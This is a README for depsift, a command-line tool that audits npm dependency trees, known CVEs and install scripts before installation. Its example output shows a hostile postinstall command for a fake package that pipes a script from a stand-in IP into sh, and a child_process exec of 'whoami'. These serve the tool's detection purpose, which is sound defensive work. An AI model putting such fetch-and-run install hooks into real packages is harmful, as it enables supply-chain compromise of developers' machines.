# depsift

**Should I install this?** See what a single npm dependency *really* drags in — packages, disk, and the install scripts that run code on your machine — **before** you run `npm install`.

```sh
npx depsift express
```

```
  should i install express ?

  📦 68 packages added        (28 direct, you asked for 1)
  👤 38 maintainers you'd be trusting
  💾 2.0 MB on disk
  ✓  no install scripts
  🕰  oldest dep last shipped 11y ago — ee-first (26 stale, 2y+)
  ──────────────────────────────────────────────
  GRADE  B   "some deps haven't shipped in years — may be unmaintained."
  resolved like npm — highest version satisfying each range
```

You asked for **1** package. You got **68**. That's the npm deal — and most of the time you never look. `depsift` makes you look, in two seconds, with no install.

**Or audit your whole app at once** — run it with no argument in any project:

```sh
npx depsift
```
```
  should i trust my-app's dependencies ?

  📦 266 packages in the tree        (3 direct deps) · 233 unique names
  👤 135 maintainers you'd be trusting
  💾 13 MB on disk
  ⚠  1 package runs code on your machine at install:
     node-sass
       postinstall: node scripts/build.js
  🪦 12 deprecated package(s)
  🕰  oldest dep last shipped 13y ago — async-foreach (208 stale, 2y+)
  ──────────────────────────────────────────────
  GRADE  D   "..."
```

That's your entire `dependencies` + `devDependencies` tree — every maintainer you trust and every install script that runs — in two seconds, no install.

### npm, pnpm, bun, yarn

In project mode `depsift` reads your **lockfile** when one is present, so the audit reflects the *exact* versions you actually installed — not a fresh re-resolve. Auto-detected, in this order:

| Lockfile | Manager |
| --- | --- |
| `pnpm-lock.yaml` | pnpm (v5 / v6 / v9) |
| `bun.lock` | bun (text lockfile) |
| `package-lock.json` · `npm-shrinkwrap.json` | npm |
| `yarn.lock` | yarn (classic & berry) |

No lockfile (or `--no-lock`) falls back to resolving `package.json` ranges the way npm would — highest version satisfying each range. Bun's **binary** `bun.lockb` can't be read without bun; depsift says so and audits your `package.json` ranges instead (run `bun install --save-text-lockfile` to get a readable `bun.lock`). The CLI itself has zero dependencies and runs under any of them — `npx`, `pnpm dlx`, `bunx`, `yarn dlx`.

---

## Why

Every `npm install` is a trust decision you make blind:

- **You add 1 package, you trust 68** — and **38 maintainers** you've never heard of. Each is code, and a person with publish rights, that ends up in your app.
- **Some run scripts on your machine** the moment they install (`postinstall`, `preinstall`). That's the exact door supply-chain attacks walk through.
- **Some are deprecated or abandoned** — `depsift` shows the oldest dep's last publish, so "last shipped 11 years ago" stops being a surprise *after* it's in your lockfile.

`depsift` answers all of that **before** you commit, straight from the npm registry. No install. No `node_modules`. No dependencies of its own.

## Real CVEs — not guesses

`depsift` checks every resolved package against npm's own advisory database (the same data `npm audit` uses) and matches the exact vulnerable version ranges across the **whole tree** — transitive deps included. No Snyk account, no AI that might hallucinate a CVE, no token.

```sh
npx depsift lodash@4.17.4
```
```
  🛡  10 known vulnerabilities (1 critical, 4 high, 5 moderate)
     [critical] lodash@4.17.4 Prototype Pollution in lodash
     [high]     lodash@4.17.4 Command Injection in lodash
  ──────────────────────────────────────────────
  GRADE  F   "5 serious known vulnerabilities in the tree (1 critical, 4 high) — patch or avoid."
```

A critical CVE alone forces an **F** (exit 2), so it gates CI. Install a patched range and the card goes green.

## The killer feature: it shows you the actual install script

Other tools tell you a package *has* an install script. `depsift` shows you **the exact command that will run on your machine** — and flags it if it reaches the network, pipes to a shell, evals, or reads your env.

A legit native build looks calm:

```sh
npx depsift node-sass
```
```
  ⚠  1 package runs code on your machine at install:
     node-sass
       install:     node scripts/install.js
       postinstall: node scripts/build.js
```

A package doing something it shouldn't lights up red:

```
  ⚠  2 packages run code on your machine at install:
     evil-demo 🚨 dynamic-exec, network, pipe-to-shell
       install:     node -e "require('child_process').exec('whoami')"
       postinstall: curl http://198.51.100.9/x.sh | sh
     helper
       postinstall: node build.js
  ────────────────────────────────────────
  GRADE  F   "an install script is flagged for dynamic-exec, network,
              pipe-to-shell — read the command above before you trust it."
```

`npm install` runs these **before any of your own code** — it's the exact door supply-chain attacks walk through. `depsift` reads the literal command straight from the registry (no install, no tarball download) and scans it for:

`network` · `pipe-to-shell` · `dynamic-exec` · `obfuscation` · `reads-env` · `destructive/recon`

So "I'll just install it" becomes a decision instead of a reflex.

## Usage

```sh
npx depsift <package>      # audit one package before you add it
npx depsift react
npx depsift @scope/name
npx depsift left-pad@1.3.0  # pin a version or range
npx depsift express@^5      # ranges work — resolved like npm

npx depsift                 # no arg → audit ./package.json's whole tree
```

No flags to learn. Run it, read the card, move on.

### Exit codes (gate it in CI)

| code | meaning |
| ---- | ------- |
| `0`  | grade A–D |
| `2`  | grade **F** — risky |
| `1`  | package not found / network error |

```sh
# fail a PR that tries to add a package graded F
npx depsift "$NEW_DEP" || exit 1
```

## What the grade means

Starts at 100, loses points for:

- **known CVEs** — critical −25, high −12, moderate −4, low −1 (from npm's advisory data, matched across the whole tree). A single critical forces **F**.
- **flagged install scripts** (up to −40 each) — scaled by how many danger signals one command trips (network, pipe-to-shell, eval…). This is the only thing that can sink a package to **F on its own** — danger, not size.
- **install scripts** (−5 each) — benign native builds are a mild nudge, not a death sentence
- **deprecated packages** (−5 each)
- **stale packages** (−2 each) — no publish in 2+ years
- **disk weight** (up to −12) and **dependency count** (up to −15) — bloat is a nudge, not a verdict

Maintainer count and oldest-publish age are shown for context (they're the *who* and *how-fresh* of what you're trusting); they inform the quip but don't directly move the grade.

`A` install with confidence · `B` fine · `C` look closer · `D` heavy · `F` real risk — read the install script.

## How it works

Hits the npm registry [packument](https://github.com/npm/registry/blob/master/docs/responses/package-metadata.md) endpoint and walks the dependency graph in parallel — one request per unique package, covering deps, size, install scripts, maintainers, and publish dates in a single fetch. Every dependency range is resolved **the way npm does** — the highest published version that satisfies it — with its own zero-dependency semver matcher (cross-checked against `node-semver` for parity), and the tree is deduped by `name@version`, so the package count reflects what actually lands in `node_modules`. Nothing is installed and nothing touches disk.

Zero runtime dependencies. Node 18+.

## Install (optional)

`npx depsift <pkg>` needs no install. If you want it on your PATH:

```sh
npm i -g depsift
```

## How it compares

|  | **depsift** | npq | should-install | howfat |
| --- | :---: | :---: | :---: | :---: |
| Real CVEs (npm advisories) | ✅ | via Snyk | AI-guessed | ❌ |
| Shows the literal install-script command | ✅ | ❌ (warns only) | ❌ | ❌ |
| Install-script danger scan (network/eval/…) | ✅ | ❌ | ❌ | ❌ |
| npm-accurate dependency resolution | ✅ | n/a | n/a | ✅ |
| Whole-project audit + letter grade | ✅ | ❌ | ✅ (AI) | ❌ |
| Maintainers / staleness signals | ✅ | partial | ✅ | ❌ |
| Runtime dependencies | **0** | 4 | 5 | 5 |
| Needs an account / API key / AI CLI | **no** | Snyk optional | **yes (AI)** | no |
| Deterministic (same answer every run) | ✅ | ✅ | ❌ | ✅ |
| Changes your workflow | no (read-only) | yes (`npq install`) | no | no |

`depsift` is the only one that is **zero-dependency, needs nothing installed, and shows you the exact command an install script will run** — backed by real advisory data instead of an AI's best guess.

## License

MIT
